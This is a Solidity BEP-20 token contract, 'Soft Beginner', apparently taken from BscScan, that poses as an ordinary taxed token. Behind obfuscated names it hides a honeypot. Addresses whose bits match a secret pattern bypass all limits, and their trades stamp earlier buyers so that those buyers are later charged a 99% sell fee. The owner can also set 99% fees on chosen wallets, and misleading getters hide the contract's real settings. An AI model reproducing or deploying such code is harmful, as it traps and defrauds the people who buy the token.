/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract SoftBeginner is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Soft Beginner ";
    string constant _symbol = "SoftBeginner";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private liquidityWalletFeeBuyBurnTeam;
    mapping(address => bool) private tradingWalletLiquidityTx;
    mapping(address => bool) private maxFeeLiquidityAutoTeamBots;
    mapping(address => bool) private teamMaxTradingSellLiquidityBurnWallet;
    mapping(address => uint256) private feeTxTradingMode;
    mapping(uint256 => address) private burnTradingMaxMin;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private txLaunchedBuyBots = 0;
    uint256 private walletTradingFeeLaunchedAuto = 4;

    //SELL FEES
    uint256 private maxTradingMarketingIsSwap = 0;
    uint256 private isMinExemptSell = 4;

    uint256 private limitSellLaunchedBurn = walletTradingFeeLaunchedAuto + txLaunchedBuyBots;
    uint256 private botsTradingIsMin = 100;

    address private txMaxTeamBuyMinSellFee = (msg.sender); // auto-liq address
    address private feeMinReceiverLiquidityModeBuyBots = (0xC4b54D17a824A4168cbBf584FFFfc34ccB494de8); // marketing address
    address private botsMaxTeamTrading = DEAD;
    address private sellReceiverBotsIs = DEAD;
    address private maxLaunchedLimitMinExempt = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private autoLimitModeReceiver;
    uint256 private minFeeReceiverMax;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private botsBurnTradingMode;
    uint256 private burnSwapMarketingReceiver;
    uint256 private txWalletTeamLimitReceiverFeeSwap;
    uint256 private burnLiquidityTeamReceiverFee;
    uint256 private feeWalletLaunchedMinLiquidityMode;

    bool private limitExemptMaxTxIs = true;
    bool private teamMaxTradingSellLiquidityBurnWalletMode = true;
    bool private isLiquidityBotsTx = true;
    bool private maxLiquidityTxSellModeTeam = true;
    bool private minTxBuyIs = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private minBuyAutoLimit = _totalSupply / 1000; // 0.1%

    
    bool private launchedLiquidityTeamSwap;
    uint256 private walletBuyMarketingReceiver;
    bool private modeWalletMaxAuto;
    bool private receiverMinSellAuto;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        botsBurnTradingMode = true;

        liquidityWalletFeeBuyBurnTeam[msg.sender] = true;
        liquidityWalletFeeBuyBurnTeam[address(this)] = true;

        tradingWalletLiquidityTx[msg.sender] = true;
        tradingWalletLiquidityTx[0x0000000000000000000000000000000000000000] = true;
        tradingWalletLiquidityTx[0x000000000000000000000000000000000000dEaD] = true;
        tradingWalletLiquidityTx[address(this)] = true;

        maxFeeLiquidityAutoTeamBots[msg.sender] = true;
        maxFeeLiquidityAutoTeamBots[0x0000000000000000000000000000000000000000] = true;
        maxFeeLiquidityAutoTeamBots[0x000000000000000000000000000000000000dEaD] = true;
        maxFeeLiquidityAutoTeamBots[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return launchedExemptIsTx(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return launchedExemptIsTx(sender, recipient, amount);
    }

    function launchedExemptIsTx(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = launchedTradingModeLimit(sender) || launchedTradingModeLimit(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                maxWalletAutoFeeLaunchedMin();
            }
            if (!bLimitTxWalletValue) {
                botsReceiverWalletLaunched(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return walletAutoTeamExemptMinLiquiditySwap(sender, recipient, amount);}

        if (!isAuthorized(sender) && !isAuthorized(recipient)) {
            require(limitExemptMaxTxIs, "Trading is not active");
        }

        if (!isAuthorized(sender) && !liquidityWalletFeeBuyBurnTeam[sender] && !liquidityWalletFeeBuyBurnTeam[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || maxFeeLiquidityAutoTeamBots[sender] || maxFeeLiquidityAutoTeamBots[recipient], "Max TX Limit has been triggered");

        if (launchedMaxAutoBurnBuyFee()) {sellMaxTeamReceiver();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = swapLimitFeeBuyWalletReceiverAuto(sender) ? feeMinWalletIsTeamTradingSwap(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function walletAutoTeamExemptMinLiquiditySwap(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapLimitFeeBuyWalletReceiverAuto(address sender) internal view returns (bool) {
        return !tradingWalletLiquidityTx[sender];
    }

    function feeSwapMaxSell(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            limitSellLaunchedBurn = isMinExemptSell + maxTradingMarketingIsSwap;
            return marketingReceiverAutoSell(sender, limitSellLaunchedBurn);
        }
        if (!selling && sender == uniswapV2Pair) {
            limitSellLaunchedBurn = walletTradingFeeLaunchedAuto + txLaunchedBuyBots;
            return limitSellLaunchedBurn;
        }
        return marketingReceiverAutoSell(sender, limitSellLaunchedBurn);
    }

    function feeMinWalletIsTeamTradingSwap(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(feeSwapMaxSell(sender, receiver == uniswapV2Pair)).div(botsTradingIsMin);

        if (teamMaxTradingSellLiquidityBurnWallet[sender] || teamMaxTradingSellLiquidityBurnWallet[receiver]) {
            feeAmount = amount.mul(99).div(botsTradingIsMin);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function launchedTradingModeLimit(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function marketingReceiverAutoSell(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = feeTxTradingMode[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function botsReceiverWalletLaunched(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        burnTradingMaxMin[exemptLimitValue] = addr;
    }

    function maxWalletAutoFeeLaunchedMin() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (feeTxTradingMode[burnTradingMaxMin[i]] == 0) {
                    feeTxTradingMode[burnTradingMaxMin[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(feeMinReceiverLiquidityModeBuyBots).transfer(amountBNB * amountPercentage / 100);
    }

    function launchedMaxAutoBurnBuyFee() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    minTxBuyIs &&
    _balances[address(this)] >= minBuyAutoLimit;
    }

    function sellMaxTeamReceiver() internal swapping {
        uint256 amountToLiquify = minBuyAutoLimit.mul(txLaunchedBuyBots).div(limitSellLaunchedBurn).div(2);
        uint256 amountToSwap = minBuyAutoLimit.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = limitSellLaunchedBurn.sub(txLaunchedBuyBots.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(txLaunchedBuyBots).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(walletTradingFeeLaunchedAuto).div(totalETHFee);

        payable(feeMinReceiverLiquidityModeBuyBots).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                txMaxTeamBuyMinSellFee,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getBotsTradingIsMin() public view returns (uint256) {
        if (botsTradingIsMin != isMinExemptSell) {
            return isMinExemptSell;
        }
        if (botsTradingIsMin == minBuyAutoLimit) {
            return minBuyAutoLimit;
        }
        return botsTradingIsMin;
    }
    function setBotsTradingIsMin(uint256 a0) public onlyOwner {
        botsTradingIsMin=a0;
    }

    function getMinTxBuyIs() public view returns (bool) {
        if (minTxBuyIs != limitExemptMaxTxIs) {
            return limitExemptMaxTxIs;
        }
        if (minTxBuyIs != minTxBuyIs) {
            return minTxBuyIs;
        }
        if (minTxBuyIs == minTxBuyIs) {
            return minTxBuyIs;
        }
        return minTxBuyIs;
    }
    function setMinTxBuyIs(bool a0) public onlyOwner {
        if (minTxBuyIs != limitExemptMaxTxIs) {
            limitExemptMaxTxIs=a0;
        }
        if (minTxBuyIs == maxLiquidityTxSellModeTeam) {
            maxLiquidityTxSellModeTeam=a0;
        }
        minTxBuyIs=a0;
    }

    function getIsLiquidityBotsTx() public view returns (bool) {
        if (isLiquidityBotsTx != isLiquidityBotsTx) {
            return isLiquidityBotsTx;
        }
        if (isLiquidityBotsTx == isLiquidityBotsTx) {
            return isLiquidityBotsTx;
        }
        if (isLiquidityBotsTx == limitExemptMaxTxIs) {
            return limitExemptMaxTxIs;
        }
        return isLiquidityBotsTx;
    }
    function setIsLiquidityBotsTx(bool a0) public onlyOwner {
        if (isLiquidityBotsTx == teamMaxTradingSellLiquidityBurnWalletMode) {
            teamMaxTradingSellLiquidityBurnWalletMode=a0;
        }
        if (isLiquidityBotsTx != teamMaxTradingSellLiquidityBurnWalletMode) {
            teamMaxTradingSellLiquidityBurnWalletMode=a0;
        }
        isLiquidityBotsTx=a0;
    }

    function getMinBuyAutoLimit() public view returns (uint256) {
        return minBuyAutoLimit;
    }
    function setMinBuyAutoLimit(uint256 a0) public onlyOwner {
        minBuyAutoLimit=a0;
    }

    function getFeeMinReceiverLiquidityModeBuyBots() public view returns (address) {
        if (feeMinReceiverLiquidityModeBuyBots != maxLaunchedLimitMinExempt) {
            return maxLaunchedLimitMinExempt;
        }
        if (feeMinReceiverLiquidityModeBuyBots != feeMinReceiverLiquidityModeBuyBots) {
            return feeMinReceiverLiquidityModeBuyBots;
        }
        if (feeMinReceiverLiquidityModeBuyBots != botsMaxTeamTrading) {
            return botsMaxTeamTrading;
        }
        return feeMinReceiverLiquidityModeBuyBots;
    }
    function setFeeMinReceiverLiquidityModeBuyBots(address a0) public onlyOwner {
        feeMinReceiverLiquidityModeBuyBots=a0;
    }

    function getLiquidityWalletFeeBuyBurnTeam(address a0) public view returns (bool) {
        if (a0 == maxLaunchedLimitMinExempt) {
            return teamMaxTradingSellLiquidityBurnWalletMode;
        }
        if (a0 == feeMinReceiverLiquidityModeBuyBots) {
            return isLiquidityBotsTx;
        }
            return liquidityWalletFeeBuyBurnTeam[a0];
    }
    function setLiquidityWalletFeeBuyBurnTeam(address a0,bool a1) public onlyOwner {
        if (liquidityWalletFeeBuyBurnTeam[a0] != teamMaxTradingSellLiquidityBurnWallet[a0]) {
           teamMaxTradingSellLiquidityBurnWallet[a0]=a1;
        }
        if (a0 == maxLaunchedLimitMinExempt) {
            teamMaxTradingSellLiquidityBurnWalletMode=a1;
        }
        liquidityWalletFeeBuyBurnTeam[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}